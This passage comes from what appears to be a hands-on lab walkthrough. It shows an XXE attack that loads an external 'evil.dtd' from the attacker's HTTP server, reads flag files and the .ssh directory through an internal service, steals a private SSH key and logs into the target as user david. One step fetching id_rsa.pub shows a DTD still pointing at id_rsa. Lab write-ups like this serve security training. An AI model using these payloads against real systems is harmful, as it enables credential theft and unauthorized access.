+</code></pre><p id="d72eb410-2e45-4ac7-af21-416ca179bd08" class="">Start a Python-based HTTP server on port 8080:</p><p id="3fe3c034-658f-406b-baf5-cf7f90d75537" class="">Command:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="21e9ee97-0da2-43cb-8dac-6f31dcb63dab" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">python3 -m http.server 8080
+</code></pre><p id="4439faed-5433-4479-8ecc-57f55c91184d" class="">Send the same XXE payload we sent in the last step:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="86ca1d5b-ee10-40a9-bdcc-8f0457ae2860" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
+&lt;!DOCTYPE data [
+  &lt;!ENTITY % dtd SYSTEM &quot;http://192.220.76.2:8080/evil.dtd&quot;&gt;
+  %dtd;
+  %all;
+]&gt;
+&lt;data&gt;&amp;fileContents;&lt;/data&gt;
+</code></pre><p id="47e5cb78-6c09-48bb-9e28-9ea6045f5ef3" class="">The contents of flag1 file are retrieved:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="7f655f52-5086-40fb-8172-b28dadc82e8d" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Flag 1: 5f1210be00b4b8dfecba7b56181d905c
+</code></pre><p id="8df29eae-ccdd-499e-b675-4e664b6cf967" class="">Head back to the terminal running the Python-based HTTP server:</p><p id="75b511e7-5532-446a-ac45-bc1e379f15bb" class="">Notice there was a request from the target machine to fetch the evil.dtd file.</p><p id="0090af18-8a03-4b48-b82f-f865698fc4c3" class="">Step 9: Fetch the contents of the .ssh directory.</p><p id="fe75730f-8d21-4e1f-aa07-17a139ff915f" class="">Modify the evil.dtd file to fetch the contents of .ssh directory:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="812cf5c3-76ae-424a-8f4d-c63c79f9c274" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;
+&lt;!ENTITY % file SYSTEM &quot;http://localhost:8888/.ssh/&quot;&gt;
+&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;
+&lt;!ENTITY % all &quot;&lt;!ENTITY fileContents &#x27;%start;%file;%end;&#x27;&gt;&quot;&gt;
+</code></pre><p id="d7211d39-f2ed-4e08-bcd3-cac261326123" class="">Start a Python-based HTTP server on port 8080:</p><p id="4fd37e53-070c-47e9-b796-d1437c8fb796" class="">Command:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="274f341f-ebf0-4827-89e8-8427ef4bd6b2" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">python3 -m http.server 8080
+</code></pre><p id="9e0044dd-9ccb-4d5f-8a3d-b21a96293d3d" class="">Send the same XXE payload we sent in the last step:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="7e8f0bd7-dbc7-48a5-989e-c81aa6cd9124" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
+&lt;!DOCTYPE data [
+  &lt;!ENTITY % dtd SYSTEM &quot;http://192.220.76.2:8080/evil.dtd&quot;&gt;
+  %dtd;
+  %all;
+]&gt;
+&lt;data&gt;&amp;fileContents;&lt;/data&gt;
+</code></pre><p id="d12b5d44-236d-4b07-b131-d9169bc68b20" class="">The directory listing for .ssh directory is retrieved:</p><p id="e5a1cceb-fea1-46e8-b3ae-485a20c95aa2" class="">Save the retrieved HTML contents:</p><p id="3fefe831-e4b4-48b9-8a42-a37d0beceab8" class="">Command:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="459aabfa-1fa4-42da-8484-32cfe139a31e" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">cat listing.html
+</code></pre><p id="c9eaae2d-695b-4f7f-b4ac-e5bdfaade11e" class="">Open the listing.html file in the browser:</p><p id="e1c0dd7a-f4f8-441e-a5f6-91ba8b4b3801" class="">URL:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="5d196de3-b24e-4d93-93d2-a80195f07b04" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">file:///root/listing.html
+</code></pre><p id="61a9beff-67c7-4f0c-84e0-6bb69b95b277" class="">Notice there are three files in the .ssh directory:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a4274eee-7246-4354-b6c8-f53d20e07bc1" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">authorized_keys
+id_rsa
+id_rsa.pub
+</code></pre><p id="92916ff8-539e-452f-be8c-132d6be8cf18" class="">In the subsequent steps, we will fetch some of these files.</p><p id="cc180f62-1687-469a-82c1-fbd1df4794d8" class="">Step 10: Retrieve the private SSH keys.</p><p id="01cba5b7-09ad-43f1-ae3d-3a8f7adc7b08" class="">Modify the evil.dtd file to fetch the contents of id_rsa file:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d96ff340-c6dc-4a5b-8941-185906a99200" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;
+&lt;!ENTITY % file SYSTEM &quot;http://localhost:8888/.ssh/id_rsa&quot;&gt;
+&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;
+&lt;!ENTITY % all &quot;&lt;!ENTITY fileContents &#x27;%start;%file;%end;&#x27;&gt;&quot;&gt;
+</code></pre><p id="5dd035ee-3df1-4371-a266-c43aad99affc" class="">Start a Python-based HTTP server on port 8080:</p><p id="990a1d88-f605-445e-89b9-5c9457ba22ca" class="">Command:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="265fad46-356d-41eb-8a27-e5f4b6db8b56" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">python3 -m http.server 8080
+</code></pre><p id="78ae1547-4ae7-4c62-821a-43c8cbd4d67a" class="">Send the same XXE payload we sent in the last step:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="8041bbf0-875f-4319-ae8b-74525b28001f" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
+&lt;!DOCTYPE data [
+  &lt;!ENTITY % dtd SYSTEM &quot;http://192.220.76.2:8080/evil.dtd&quot;&gt;
+  %dtd;
+  %all;
+]&gt;
+&lt;data&gt;&amp;fileContents;&lt;/data&gt;
+</code></pre><p id="8aae47f4-c48c-47b5-8d3a-5311c1c171a3" class="">The response contains the private SSH keys.</p><p id="45617bdb-d46a-4ecc-9e2d-f08d3a9937cf" class="">Save the contents of the private keys to the id_rsa file:</p><p id="64467aa8-c93f-44c1-b266-1f4470b20b8b" class="">Command:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2a8349ff-e810-46a4-b134-9bde6ea43866" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">cat id_rsa
+</code></pre><p id="8c68b2dc-3539-4a4e-94c0-414ea175b228" class="">The private SSH key is missing the new lines.</p><p id="dc1c5d35-6a11-4e81-b2ae-5da3fa2c484a" class="">To restore the file, we can use the following command:</p><p id="3aea439a-a1f8-468e-b07e-ff4584f68946" class="">Command:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="3415a386-763c-4342-8e75-03e63c36011f" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">sed -e &quot;s/-----BEGIN RSA PRIVATE KEY-----/&amp;\n/&quot; \
+-e &quot;s/-----END RSA PRIVATE KEY-----/\n&amp;/&quot; \
+-e &quot;s/\S\{64\}/&amp;\n/g&quot; \
+id_rsa
+</code></pre><p id="5f0decd8-0349-4af5-a528-88b06a476aa7" class="">The output contains the properly-formatted private SSH key.</p><p id="242b0a31-058e-4503-bc80-6a3d9cb5da5d" class="">The above command does the following: - Adds a new line after the</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="c5c5ba1a-e443-4e78-bc67-42d32700c2ed" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">-----BEGIN RSA PRIVATE KEY-----
+string - Adds a new line before the
+-----END RSA PRIVATE KEY-----
+string - For all other string blocks, it adds a new line after every 64 characters
+</code></pre><p id="8a255f8e-d780-411f-9c49-23002573f77c" class="">Use the following command to save the formatted private key to the file fixed_id_rsa:</p><p id="0b2f4e9b-3bb5-4790-b73e-b638bb09b42c" class="">Command:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ec730946-e0a1-4e73-be6e-e987bd4424a1" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">sed -e &quot;s/-----BEGIN RSA PRIVATE KEY-----/&amp;\n/&quot; \
+-e &quot;s/-----END RSA PRIVATE KEY-----/\n&amp;/&quot; \
+-e &quot;s/\S\{64\}/&amp;\n/g&quot; \
+id_rsa &gt; fixed_id_rsa
+</code></pre><p id="ae2337d2-77ce-434d-bc25-688bd6abdfb9" class="">Check the contents of the fixed_id_rsa file:</p><p id="72c6c431-eaaf-456c-9b14-bdfd790e7d5f" class="">Command:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1a074194-4a48-41cf-bdfb-b52a6cf532b3" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">cat fixed_id_rsa
+</code></pre><p id="e97c553a-beb8-4494-b4a9-ef01676165a9" class="">The well-formatted private SSH key has been placed in a file.</p><p id="ed49d6ed-fa8e-4c1f-b1dc-44f8fbb631e5" class="">Step 11: Gain SSH access on the target machine.</p><p id="40d8d76c-9422-4827-bfb1-8d99c34d0de9" class="">We have the private SSH key but don’t yet know the user to whom it belongs.</p><p id="d9d6391e-9fa5-43fc-85b1-b49d926def74" class="">To use the SSH keys for login, we have to find out the corresponding user name. For that, we will be using the public SSH keys. This file could contain the email of the user or the account name followed by the hostname. In either case, we will find the user name.</p><p id="6dd34509-827e-40c5-8a0b-3d2ac55b8798" class="">Modify the evil.dtd file to fetch the contents of the id_rsa.pub file:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="5588bf71-ac1b-466f-92a6-952985bf1cdb" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;
+&lt;!ENTITY % file SYSTEM &quot;http://localhost:8888/.ssh/id_rsa&quot;&gt;
+&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;
+&lt;!ENTITY % all &quot;&lt;!ENTITY fileContents &#x27;%start;%file;%end;&#x27;&gt;&quot;&gt;
+</code></pre><p id="8f949484-89ec-4275-98a2-74572d783934" class="">Start a Python-based HTTP server on port 8080:</p><p id="43de7ed3-6d07-41b0-bc14-d43184c7e619" class="">Command:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="9290cf66-bfd2-4a8b-9794-8b35bb8c7189" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">python3 -m http.server 8080
+</code></pre><p id="bdeee2ba-bfae-4d0c-8c63-db2a767d4426" class="">Send the same XXE payload we sent in the last step:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="0c5247f0-ce90-4c0b-b9cc-6e6c1a8295cc" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
+&lt;!DOCTYPE data [
+  &lt;!ENTITY % dtd SYSTEM &quot;http://192.220.76.2:8080/evil.dtd&quot;&gt;
+  %dtd;
+  %all;
+]&gt;
+&lt;data&gt;&amp;fileContents;&lt;/data&gt;
+</code></pre><p id="d41931f4-cd96-4df1-9b41-4cc834787e69" class="">The contents of the public SSH key were successfully retrieved.</p><p id="f02d469a-c725-49cc-bf33-07e7acfb1088" class="">The email id of the user is also revealed:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="837d1225-faa5-4bf4-b46b-8b5c101fc806" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">david@insecure-corp.com
+</code></pre><p id="1ff0ccab-dcc4-462a-801c-56e7e5e3a0c0" class="">Modify the permissions of the fixed_id_rsa file and SSH into the target machine:</p><p id="bda66f30-37ba-4284-b6b1-4a853b76fbd4" class="">Commands:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="b570f273-df62-4442-bc8a-c86e9e093739" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">chmod 600 fixed_id_rsa
+ssh -i fixed_id_rsa david@demo.ine.local
+</code></pre><blockquote id="f730161d-81fe-4860-b482-37357880efbd" class="">SSH login was successful!</blockquote><p id="b16c3920-e1f1-4cfd-a70f-a5c7d391a781" class="">Step 12: Retrieve the second flag.</p><p id="c2975c9c-3680-4acc-93ba-c68836a4fba7" class="">Now that we have SSH access to the target machine, we can issue commands to perform recon and retrieve all the flags.</p><p id="75d29b4c-87a9-4769-a85a-69e9049505ad" class="">Commands:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e50f1a1b-83bf-49d9-9225-42f104aa38de" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">id
+ls
+cat flag1
+find / -iname &#x27;flag*&#x27; 2&gt;/dev/null
+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="4a6a0164-1e09-4891-9fc4-56f059171021" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Flag 1 (/home/david/flag1): 5f1210be00b4b8dfecba7b56181d905c
+</code></pre><p id="fce3d912-ed59-4590-bf9f-26a03bd287f0" class="">Flag 2 is stored in /tmp/flag2 file:</p><p id="e6ac7d38-7114-428a-9048-90eaf2122673" class="">Command:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="9f025e54-a0a1-4a88-8278-600c7cb1d760" class="code"><code class="language-Plain Text" 